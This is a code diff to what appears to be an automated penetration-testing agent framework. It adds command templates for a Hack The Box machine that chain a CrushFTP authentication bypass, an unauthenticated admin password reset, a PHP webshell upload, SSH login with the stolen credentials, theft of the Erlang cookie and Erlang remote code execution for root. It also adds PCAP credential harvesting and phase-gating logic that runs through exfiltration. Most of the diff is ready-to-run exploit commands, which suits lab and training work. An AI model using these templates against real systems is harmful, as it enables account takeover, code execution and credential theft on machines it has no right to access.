@@ -1092,6 +1092,141 @@ register(CommandTemplate(
     when="Have a raw shell (nc, telnet). Run immediately after gaining shell.",
 ))
 
+# --- Phase 19: HTB Soulmate / CrushFTP / Erlang Templates ---
+
+register(CommandTemplate(
+    name="crushftp_auth_bypass",
+    template="curl -s -k 'http://{target}/WebInterface/function/?command=getUserList&c2f={c2f_token}' -H 'Cookie: CrushAuth={c2f_token}; currentAuth={c2f_token}'",
+    description="CVE-2025-31161 — CrushFTP authentication bypass via crafted S3-style auth header. Returns admin user list without valid credentials.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    optional_params={"c2f_token": "anonymous_token"},
+    preconditions={"ports_discovered", "services_enumerated"},
+    success_indicators=["<username>", "crushadmin", "getUserList", "admin"],
+    typical_reward=25.0,
+    tags={"crushftp", "auth_bypass", "cve_2025_31161", "htb", "soulmate", "web"},
+    why="CVE-2025-31161 allows unauthenticated access to CrushFTP admin API. Critical severity, direct admin takeover.",
+    when="CrushFTP 10/11 detected on port 80/8080/443. Enumerate users before attempting credential attacks.",
+))
+
+register(CommandTemplate(
+    name="crushftp_admin_reset_password",
+    template="curl -s -k 'http://{target}/WebInterface/function/?command=setUserItem&user={admin_user}&data_action=replace&key=password&value={new_password}' -H 'Cookie: CrushAuth={c2f_token}; currentAuth={c2f_token}'",
+    description="CVE-2025-31161 — Reset any CrushFTP user password via unauthenticated admin API access.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    optional_params={"admin_user": "crushadmin", "new_password": "Pwned2025!", "c2f_token": "anonymous_token"},
+    preconditions={"ports_discovered", "services_enumerated", "vulnerability_found"},
+    success_indicators=["OK", "success", "password changed", "true"],
+    typical_reward=35.0,
+    tags={"crushftp", "password_reset", "cve_2025_31161", "htb", "soulmate"},
+    why="After confirming CVE-2025-31161, reset admin password to gain full CrushFTP control.",
+    when="CVE-2025-31161 auth bypass confirmed. Admin username known from getUserList.",
+))
+
+register(CommandTemplate(
+    name="crushftp_ftp_upload_shell",
+    template="curl -s -T /tmp/shell.php ftp://{admin_user}:{password}@{ftp_target}/WebInterface/shell.php",
+    description="Upload PHP/JSP webshell via CrushFTP FTP service using compromised admin credentials.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["ftp_target"],
+    optional_params={"admin_user": "crushadmin", "password": "Pwned2025!"},
+    preconditions={"credentials_known"},
+    success_indicators=["226", "Transfer complete", "upload", "success"],
+    typical_reward=40.0,
+    tags={"crushftp", "ftp", "upload", "webshell", "htb", "soulmate"},
+    why="CrushFTP exposes FTP on port 21. Upload webshell using reset admin creds for code execution.",
+    when="CrushFTP admin creds obtained (via password reset or discovery). FTP port open.",
+))
+
+register(CommandTemplate(
+    name="crushftp_ssh_as_user",
+    template="sshpass -p '{password}' ssh -o StrictHostKeyChecking=no {username}@{target}",
+    description="SSH login with CrushFTP-discovered or reset credentials. CrushFTP users often map to OS users.",
+    phase=AttackPhase.EXPLOITATION,
+    required_params=["target"],
+    optional_params={"username": "crushadmin", "password": "Pwned2025!"},
+    preconditions={"credentials_known"},
+    success_indicators=["$", "#", "Last login", "Welcome"],
+    typical_reward=50.0,
+    tags={"crushftp", "ssh", "shell", "htb", "soulmate"},
+    why="CrushFTP user credentials often reused for SSH login on the same host.",
+    when="Have CrushFTP admin creds. SSH port 22 open on target.",
+))
+
+register(CommandTemplate(
+    name="erlang_cookie_extract",
+    template="cat /var/lib/erlang/.erlang.cookie 2>/dev/null || cat ~/.erlang.cookie 2>/dev/null || find / -name .erlang.cookie -readable 2>/dev/null -exec cat {{}} \\;",
+    description="Extract Erlang magic cookie for RCE via Erlang distribution protocol.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    preconditions={"linux_shell_obtained"},
+    success_indicators=["COOKIE", "cookie"],
+    typical_reward=20.0,
+    tags={"erlang", "cookie", "privesc", "htb", "soulmate"},
+    why="Erlang cookie enables remote code execution via Erlang distribution protocol (epmd). Found in CrushFTP/RabbitMQ deployments.",
+    when="Have shell on host running Erlang-based service. Check for .erlang.cookie file.",
+))
+
+register(CommandTemplate(
+    name="erlang_otp_rce",
+    template="erl -sname exploit -setcookie '{cookie}' -remsh target@{hostname} -eval 'os:cmd(\"id\").'",
+    description="CVE-2025-32433 — Erlang/OTP SSH RCE via distribution protocol with stolen cookie.",
+    phase=AttackPhase.PRIVILEGE_ESCALATION,
+    required_params=[],
+    optional_params={"cookie": "ERLANGCOOKIE", "hostname": "localhost"},
+    preconditions={"linux_shell_obtained"},
+    success_indicators=["uid=", "root", "euid"],
+    typical_reward=130.0,
+    tags={"erlang", "rce", "otp", "cve_2025_32433", "htb", "soulmate", "privesc"},
+    why="Erlang/OTP SSH pre-auth RCE. If Erlang is running locally (port 2222), use cookie for root.",
+    when="Have Erlang cookie. Erlang/OTP service running (check epmd, port 4369/2222).",
+))
+
+register(CommandTemplate(
+    name="pcap_download_extract",
+    template="wget -q http://{target}/{pcap_path} -O /tmp/capture.pcap && strings /tmp/capture.pcap | grep -iE 'USER|PASS|login|password'",
+    description="Download PCAP file from target and extract credentials via strings analysis.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    optional_params={"pcap_path": "data/0.pcap"},
+    preconditions={"ports_discovered"},
+    success_indicators=["USER", "PASS", "login", "password"],
+    typical_reward=20.0,
+    tags={"pcap", "credential_extraction", "htb"},
+    why="PCAP files on web servers often contain plaintext credentials (FTP, HTTP, telnet).",
+    when="Found downloadable .pcap file on web server (via gobuster or manual inspection).",
+))
+
+register(CommandTemplate(
+    name="tshark_pcap_creds",
+    template="tshark -r /tmp/capture.pcap -Y 'ftp.request.command==USER||ftp.request.command==PASS' -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null || strings /tmp/capture.pcap | grep -iE 'USER|PASS'",
+    description="Extract FTP/HTTP credentials from PCAP using tshark structured dissection with strings fallback.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=[],
+    preconditions={"ports_discovered"},
+    success_indicators=["USER", "PASS"],
+    typical_reward=20.0,
+    tags={"pcap", "tshark", "credential_extraction", "htb"},
+    why="tshark provides structured PCAP dissection — more reliable than grep/strings for credential extraction.",
+    when="Have PCAP file downloaded. tshark preferred but strings works as fallback.",
+))
+
+register(CommandTemplate(
+    name="vhost_discover",
+    template="gobuster vhost -u http://{target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 30 2>/dev/null || ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{target} -H 'Host: FUZZ.{domain}' -fs 0",
+    description="Discover virtual hosts on target web server. Critical for HTB boxes with multiple vhosts.",
+    phase=AttackPhase.ENUMERATION,
+    required_params=["target"],
+    optional_params={"domain": "htb"},
+    preconditions={"ports_discovered"},
+    success_indicators=["Found:", "Status:", "200", "301", "302"],
+    typical_reward=15.0,
+    tags={"vhost", "web", "enumeration", "htb"},
+    why="Many HTB boxes serve different content on different vhosts. Critical discovery step.",
+    when="Web server detected. Common on HTB boxes — check for vhosts before directory enumeration.",
+))
+
 # =============================================================================
 # PHASE 4: PRIVILEGE ESCALATION
 # =============================================================================
@@ -3586,12 +3721,29 @@ def get_phase_from_state(state: Dict[str, Any]) -> AttackPhase:
     Each phase requires ALL prior phase conditions to be met too,
     preventing trivial jumps (e.g., one flag → POST_EXPLOITATION).
     
+    Phase 21: SEQUENTIAL ENFORCEMENT — phases can only advance ONE step
+    at a time. Even if state flags satisfy EXPLOITATION directly, the
+    system must first pass through RECON → ENUMERATION → EXPLOITATION.
+    This ensures methodical progression and prevents phase-skipping.
+    
     Args:
         state: Dictionary of state flags
         
     Returns:
         Current AttackPhase
     """
+    # Phase 21: Sequential phase ordering for step-by-step enforcement
+    PHASE_SEQUENCE = [
+        AttackPhase.RECON,
+        AttackPhase.ENUMERATION,
+        AttackPhase.EXPLOITATION,
+        AttackPhase.PRIVILEGE_ESCALATION,
+        AttackPhase.LATERAL_MOVEMENT,
+        AttackPhase.POST_EXPLOITATION,
+        AttackPhase.EXFILTRATION,
+        AttackPhase.CLOSEOUT,
+    ]
+    
     # Count service-related flags for ENUMERATION gate
     service_flags = sum(
         1 for svc in ["http", "smb", "ssh", "ftp", "ldap", "dns", "snmp", "nfs", "winrm", "kerberos"]
@@ -3651,7 +3803,24 @@ def get_phase_from_state(state: Dict[str, Any]) -> AttackPhase:
     
     # Phase 6.9: CLOSEOUT auto-advance — once data is exfiltrated, go to CLOSEOUT.
     # The SmartCoach hard-gate forces cleanup commands. No chicken-and-egg deadlock.
-    return AttackPhase.CLOSEOUT
+    target_phase = AttackPhase.CLOSEOUT
+    
+    # ── Phase 21: SEQUENTIAL GATE — never skip more than one phase ──
+    # If _highest_reached_phase is tracked in state, clamp advancement to
+    # at most one phase above the highest previously reached phase.
+    # This forces RECON → ENUM → EXPLOIT → ... step by step.
+    highest_reached = state.get("_highest_reached_phase")
+    if highest_reached is not None:
+        try:
+            highest_idx = PHASE_SEQUENCE.index(highest_reached)
+            target_idx = PHASE_SEQUENCE.index(target_phase)
+            # Allow at most one phase ahead of highest reached
+            if target_idx > highest_idx + 1:
+                target_phase = PHASE_SEQUENCE[highest_idx + 1]
+        except (ValueError, IndexError):
+            pass
+    
+    return target_phase
 
 
 def get_commands_by_tag(tag: str) -> List[CommandTemplate]:
